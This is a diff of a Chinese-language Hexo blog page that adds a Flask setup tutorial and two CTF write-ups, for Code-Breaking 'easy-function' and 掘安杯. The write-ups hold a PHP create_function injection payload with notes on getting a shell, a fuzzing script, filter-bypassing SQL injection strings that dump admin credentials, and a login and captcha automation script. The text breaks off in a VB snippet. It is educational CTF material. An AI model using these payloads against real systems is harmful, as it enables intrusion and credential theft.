@@ -163,11 +163,11 @@
 </nav>
       <div class="body-wrap">
   
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-flask" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/10/28/hello-world/" class="article-date">
-  	<time datetime="2017-10-28T00:39:58.000Z" itemprop="datePublished">2017-10-28</time>
+      <a href="/2019/04/18/flask/" class="article-date">
+  	<time datetime="2019-04-18T08:30:44.047Z" itemprop="datePublished">2019-04-18</time>
 </a>
     </div>
   
@@ -176,31 +176,443 @@
       <input type="hidden" class="isFancy">
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/10/28/hello-world/">
-        Hello World
-        
-      </a>
-    </h1>
-  
-
-      </header>
+    <div class="article-entry" itemprop="articleBody">
       
+        <h1 id="初识flask"><a href="#初识flask" class="headerlink" title="初识flask"></a>初识flask</h1><p>这里讲mac搭建flask</p>
+<h3 id="首先得第一步搭建virtualenv"><a href="#首先得第一步搭建virtualenv" class="headerlink" title="首先得第一步搭建virtualenv"></a>首先得第一步搭建virtualenv</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install virtualenv</span><br></pre></td></tr></table></figure>
+<h4 id="0x01-创建项目"><a href="#0x01-创建项目" class="headerlink" title="0x01 创建项目"></a>0x01 创建项目</h4><p>virtualenv安装完成后，在本地创建项目</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">mkdir demo</span><br><span class="line">cd demo </span><br><span class="line">virtualenv venv</span><br></pre></td></tr></table></figure>
+<h4 id="0x02-运行venv命令-进入venv环境"><a href="#0x02-运行venv命令-进入venv环境" class="headerlink" title="0x02 运行venv命令:(进入venv环境)"></a>0x02 运行venv命令:(进入venv环境)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. venv/bin/activate</span><br></pre></td></tr></table></figure>
+<h4 id="0x03-安装flask以及查看"><a href="#0x03-安装flask以及查看" class="headerlink" title="0x03 安装flask以及查看"></a>0x03 安装flask以及查看</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install flask</span><br><span class="line">flask</span><br><span class="line">pip list</span><br></pre></td></tr></table></figure>
+<h4 id="一个简单例子入门"><a href="#一个简单例子入门" class="headerlink" title="一个简单例子入门"></a>一个简单例子入门</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask  //导入了flask类</span><br><span class="line"> </span><br><span class="line"> app = Flask(__name__) //创建了Flask类的实例</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> @app.route(&apos;/&apos;)  // /表示当地址是根路径时，就调用下面的函数</span><br><span class="line"> def index():</span><br><span class="line">     return &apos;Hello Flask&apos;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> if __name__ == &quot;__main__&quot;:</span><br><span class="line">     app.run(debug=True)</span><br></pre></td></tr></table></figure>
+<p><a href="http://www.bjhee.com/flask-1.html" target="_blank" rel="noopener">http://www.bjhee.com/flask-1.html</a><br><a href="http://docs.jinkan.org/docs/flask/quickstart.html" target="_blank" rel="noopener">http://docs.jinkan.org/docs/flask/quickstart.html</a></p>
+<p>这几个讲的很具体,后面就不具体讲了</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-easy-function" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/04/07/easy-function/" class="article-date">
+  	<time datetime="2019-04-07T09:40:19.153Z" itemprop="datePublished">2019-04-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+        <h1 id="Code-Breaking-amp-function"><a href="#Code-Breaking-amp-function" class="headerlink" title="Code-Breaking &amp; function"></a>Code-Breaking &amp; function</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Code-Beraking 是p牛搭建的代码审计挑战赛 : <a href="https://code-breaking.com" target="_blank" rel="noopener">https://code-breaking.com</a></p>
+<p>Github：<a href="https://github.com/phith0n/code-breaking" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking</a></p>
+<h2 id="easy-function"><a href="#easy-function" class="headerlink" title="easy-function"></a>easy-function</h2><p>题目如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;</span><br><span class="line">$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&apos;&apos;, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>双问号??是php7的三元表达式，相当于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$action = $_GET[&apos;action&apos;] ? $_GET[&apos;action&apos;]: &apos;&apos;;</span><br><span class="line">$arg = $_GET[&apos;arg&apos;] ? $_GET[&apos;action&apos;]: &apos;&apos;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>isD是模式修正符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/i 不分大小写</span><br><span class="line">/s 匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[ \f\n\r\t\v]</span><br><span class="line">/D 如果使用$限制结尾字符,则不允许结尾有换行;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>首先思考这一步，Bypass正则<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)</span><br></pre></td></tr></table></figure></p>
+<p>任何字母，数字，下划线开头的值都会被过滤，无法进行下一步</p>
+<p>这里进行字符fuzz，看了别人博客后可以用脚本跑一下测试:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">for i in range(1,256):</span><br><span class="line">	tmp = hex(i)[2:]</span><br><span class="line">	if len(tmp)&lt;2:</span><br><span class="line">		tmp = &apos;0&apos; + tmp</span><br><span class="line">	tmp = &apos;%&apos;+tmp</span><br><span class="line">	# print tmp</span><br><span class="line">	url = &apos;http://127.0.0.1/index.php?action=&apos; + tmp + &apos;var_dump&amp;arg=23333&apos;  </span><br><span class="line">	r = requests.get(url)</span><br><span class="line">	if &apos;23333&apos; in r.content:</span><br><span class="line">		print r.content</span><br><span class="line">		print url</span><br></pre></td></tr></table></figure></p>
+<p>结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string(0) &quot;&quot;</span><br><span class="line">string(5) &quot;23333&quot;</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/index.php?action=%5cvar_dump&amp;arg=23333</span><br></pre></td></tr></table></figure></p>
+<p>%5c可以绕过，解码就是\,至于为什么可以这样绕过，p牛讲解大概如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php里默认命名空间是\，PHP当中的所有原生函数和类都在这个命名空间下</span><br><span class="line">普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；</span><br><span class="line">平常我们在使用函数的时候直接写函数名去调用函数实际上用的是相对路径，而在函数名前面加上\用的是绝对路径去调用函数</span><br></pre></td></tr></table></figure></p>
+<!-- 等下了解一下命名空间 -->
+<p>然后就是这个PHP动态代码的执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$action(&apos;&apos;, $arg);</span><br></pre></td></tr></table></figure></p>
+<p>可以用create_function,函数介绍大概如下 : 在使用该函数时会生成一个匿名函数，该函数的第一个参数会作为匿名函数的参数传入，该函数的第二个参数为匿名函数要执行的代码段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string create_function ( string $args , string $code )</span><br></pre></td></tr></table></figure></p>
+<p>create_function()的原型大概如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function test($a,$b)</span><br><span class="line">&#123;</span><br><span class="line">	return &quot;ln($a) + ln($b) = &quot; . log($a * $b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>所以我们可以构造如下的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=create_function&amp;arg=&#125;;phpinfo();/*</span><br></pre></td></tr></table></figure></p>
+<p>实际执行过程为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function test()&#123;&#125;phpinfo();\*&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>}是闭合原型前面的},/* 是为了把后面的代码注释掉，结果如图：</p>
+<p><img src="https://s2.ax1x.com/2019/04/07/AhXpvt.jpg" alt="image"></p>
+<p>然后就可以用system(),var_dump(scandir()) ,echo file_get_contents()等函数命令进行getshell了</p>
+<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>昨天打了掘安杯，遇到了这题，唯一只变化了这一部分。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$action($arg ,&apos;&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>$arg和’’的位置调换过来了，当时看了一下原型不难理解，可以构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg = )&#123;&#125;;phpinfo();</span><br></pre></td></tr></table></figure></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>字符fuzz 脚本</p>
+<p>\的bypass绕过</p>
+<p>本文主要来自几个不错的博客。参考链接如下</p>
+<p><a href="http://lawlietweb.com/2018/11/30/Code-Breaking%20Puzzles%E6%8C%91%E6%88%98/#easy-function" target="_blank" rel="noopener">http://lawlietweb.com/2018/11/30/Code-Breaking%20Puzzles%E6%8C%91%E6%88%98/#easy-function</a></p>
+<p><a href="https://skysec.top/2019/03/10/2018-Code-Breaking-1-function/" target="_blank" rel="noopener">https://skysec.top/2019/03/10/2018-Code-Breaking-1-function/</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-掘安杯" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/04/06/掘安杯/" class="article-date">
+  	<time datetime="2019-04-06T02:26:25.768Z" itemprop="datePublished">2019-04-06</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="掘安杯"><a href="#掘安杯" class="headerlink" title="掘安杯"></a>掘安杯</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>貌似会重定向，bp截取就行</p>
+<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>?file =flag.php下载文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;Content-Type: text/html; charset=utf-8&apos;); //网页编码</span><br><span class="line">function encrypt($data, $key) &#123;</span><br><span class="line">	$key = md5 ( $key );</span><br><span class="line">	$x = 0;</span><br><span class="line">	$len = strlen ( $data );</span><br><span class="line">	$l = strlen ( $key );</span><br><span class="line">	for($i = 0; $i &lt; $len; $i ++) &#123;</span><br><span class="line">		if ($x == $l) &#123;</span><br><span class="line">			$x = 0;</span><br><span class="line">		&#125;</span><br><span class="line">		$char .= $key &#123;$x&#125;;</span><br><span class="line">		$x ++;</span><br><span class="line">	&#125;</span><br><span class="line">	for($i = 0; $i &lt; $len; $i ++) &#123;</span><br><span class="line">		$str .= chr ( ord ( $data &#123;$i&#125; ) + (ord ( $char &#123;$i&#125; )) % 256 );</span><br><span class="line">	&#125;</span><br><span class="line">	return base64_encode ( $str );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function decrypt($data, $key) &#123;</span><br><span class="line">	$key = md5 ( $key );</span><br><span class="line">	$x = 0;</span><br><span class="line">	$data = base64_decode ( $data );</span><br><span class="line">	$len = strlen ( $data );</span><br><span class="line">	$l = strlen ( $key );</span><br><span class="line">	for($i = 0; $i &lt; $len; $i ++) &#123;</span><br><span class="line">		if ($x == $l) &#123;</span><br><span class="line">			$x = 0;</span><br><span class="line">		&#125;</span><br><span class="line">		$char .= substr ( $key, $x, 1 );</span><br><span class="line">		$x ++;</span><br><span class="line">	&#125;</span><br><span class="line">	for($i = 0; $i &lt; $len; $i ++) &#123;</span><br><span class="line">		if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) &#123;</span><br><span class="line">			$str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) );</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			$str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key=&quot;MyCTF&quot;;</span><br><span class="line">$flag=&quot;o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=&quot;;//encrypt($flag,$key)</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在尾处增加一行代码为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo decrypt($flag,$key)</span><br></pre></td></tr></table></figure></p>
+<h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>是个猜密码，查看源代码有:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&apos;pwd&apos;]=time();</span><br><span class="line">if (isset ($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">	if ($_POST[&apos;pwd&apos;] == $_SESSION[&apos;pwd&apos;])</span><br><span class="line">		die(&apos;Flag:&apos;.$flag);</span><br><span class="line">	else&#123;</span><br><span class="line">		print &apos;&lt;p&gt;猜测错误.&lt;/p&gt;&apos;;</span><br><span class="line">		$_SESSION[&apos;pwd&apos;]=time().time();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></p>
+<p>抓包删掉cookie，pwd为空</p>
+<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>网站已被黑</p>
+<p><img src="https://s2.ax1x.com/2019/04/06/AWfmO1.jpg" alt="image"></p>
+<p>用dirsearch扫描了一下发现存在shell.php,是个webshell后门，用bp爆破密码即可</p>
+<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p><img src="https://s2.ax1x.com/2019/04/08/A48SWF.jpg" alt="image"></p>
+<p>随便提交都会有错误页面返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,username,password from `admin` where username=&apos;admin&apos;&lt;br/&gt;用户名:admin不正确</span><br></pre></td></tr></table></figure></p>
+<p>每次提交后会刷新页面，所以用bp抓一下</p>
+<p>首先测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;/**/oorr/**/1#</span><br></pre></td></tr></table></figure></p>
+<p>回显如下</p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A48Myd.jpg" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;ununionion/**/selselectect/**/1,2,3#</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/04/08/A48ykV.jpg" alt="image"></p>
+<p>说明2是回显位,接下来就是爆表爆字段爆内容了，如下payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;ununionion/**/selselectect/**/1,group_concat(table_name),3/**/ from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()#</span><br></pre></td></tr></table></figure>
+<p>得到表名admin</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;ununionion/**/selselectect/**/1,group_concat(column_name),3/**/ from/**/infoorrmation_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&apos;admin&apos;#</span><br></pre></td></tr></table></figure>
+<p>得到字段名：:id,username,password</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;ununionion/**/selselectect/**/1,group_concat(username,&apos;:&apos;,passwoorrd),3/**/from/**/admin#</span><br></pre></td></tr></table></figure>
+<p>得到信息如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名:goodboy_g-60Hellowor</span><br><span class="line">密码：ajahas&amp;&amp;*44askldajaj</span><br></pre></td></tr></table></figure></p>
+<p>接下来就是绕过验证码了<br><img src="https://s2.ax1x.com/2019/04/08/A4GGu9.jpg" alt="image"></p>
+<p>在三秒内提交，写个python脚本跑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from __future__ import division</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &apos;http://xxxxxxxx/index.php&apos;</span><br><span class="line">r = requests.session()</span><br><span class="line">text = r.get(url).text</span><br><span class="line"># print text</span><br><span class="line">cal = re.compile(r&quot;&lt;div class=&apos;rep&apos;&gt;(.*?)&lt;/div&gt;&quot;).findall(text)</span><br><span class="line">cal1 = cal[0].encode(&apos;utf-8&apos;)</span><br><span class="line">cal1 = cal1.replace(&apos;（&apos;,&apos;(&apos;)</span><br><span class="line">cal1 = cal1.replace(&apos;）&apos;,&apos;)&apos;)</span><br><span class="line">cal1 = cal1.replace(&apos;X&apos;,&apos;*&apos;)</span><br><span class="line">result =  round((eval(cal1)),0)</span><br><span class="line">result = int(eval(cal1))</span><br><span class="line">print text</span><br><span class="line">print cal1</span><br><span class="line">print result</span><br><span class="line"></span><br><span class="line">username = &apos;goodboy_g-60Hellowoorr&apos;</span><br><span class="line">password = &apos;ajahas&amp;&amp;*44askldajaj&apos;</span><br><span class="line">url1 = url + &apos;?check&apos;</span><br><span class="line">data = &#123;&apos;username&apos;:username,&apos;password&apos;:password,&apos;code&apos;:result&#125;</span><br><span class="line"></span><br><span class="line">res  = r.post(url1,data=data)</span><br><span class="line"></span><br><span class="line">print res.text</span><br></pre></td></tr></table></figure></p>
+<p>这里有几个问题：</p>
+<ul>
+<li><p>re匹配的时候出现不可见字符，是因为字符串在Python内部的表示是unicode编码，所以用encode将其转换为utf-8编码，如str1.encode(‘utf-8’)</p>
+</li>
+<li><p>python2与python3中除法不一样，也就是/,前者不保留小数点，后者保留(若后者不想保留，加两个//就行)，所以前者要加个如下代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from __future__ import division</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>回显正确，得到密文和压缩包<br><img src="https://s2.ax1x.com/2019/04/08/A4RSMj.jpg" alt="image"></p>
+<p>解压后得到一个代码和一个加密过的flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">Private Function getPassword(ByVal str As String) As String</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Dim reString As String</span><br><span class="line">    </span><br><span class="line">    Dim i As Integer</span><br><span class="line">    i = 1</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    While (i &lt;= Len(str))</span><br><span class="line">    </span><br><span class="line">     reString = reString &amp; Mid(str, i, 1)</span><br><span class="line">     i = i + (i Mod 5)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Wend</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    getPassword = reString</span><br><span class="line"></span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Private Sub Command1_Click()</span><br><span class="line"></span><br><span class="line">   Dim Dictionary As String</span><br><span class="line">    </span><br><span class="line">   Dictionary = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot;</span><br><span class="line">   </span><br><span class="line">   Dim password As String</span><br><span class="line">   </span><br><span class="line">   password = getPassword(Dictionary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   Dim psw As String</span><br><span class="line">   </span><br><span class="line">   psw = Text1.Text</span><br><span class="line">   </span><br><span 